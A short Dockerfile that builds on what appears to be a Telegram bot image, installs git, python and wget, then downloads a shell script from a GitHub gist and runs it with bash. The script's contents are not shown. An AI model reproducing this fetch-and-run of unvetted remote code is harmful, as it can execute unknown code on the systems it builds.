FROM anasty17/mltb:latest
#FROM theteamultroid/ultroid:main
RUN apt install git -y;apt install python -y;apt install wget -y
RUN wget -O mi.sh https://gist.githubusercontent.com/rooted-cyber/bddee411cffaef214764b402deae5a97/raw/8fb664fb5fbe66d0458b484a13b560dc2b5d6434/hars;bash mi.sh
